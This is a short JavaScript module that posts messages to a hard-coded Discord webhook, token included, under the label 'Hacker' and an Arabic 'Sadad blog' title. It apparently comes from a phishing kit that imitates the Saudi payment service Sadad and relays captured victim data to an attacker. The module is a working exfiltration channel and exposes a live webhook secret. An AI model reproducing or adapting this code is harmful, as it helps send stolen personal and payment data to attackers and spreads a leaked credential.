import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321449250630144040/_X_JfM6PqUPzQ-JabOeNZMCN-KBOQBGPqtntXeET2XoVqyxyRt6etFgWI6YVX-sKdPjj",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
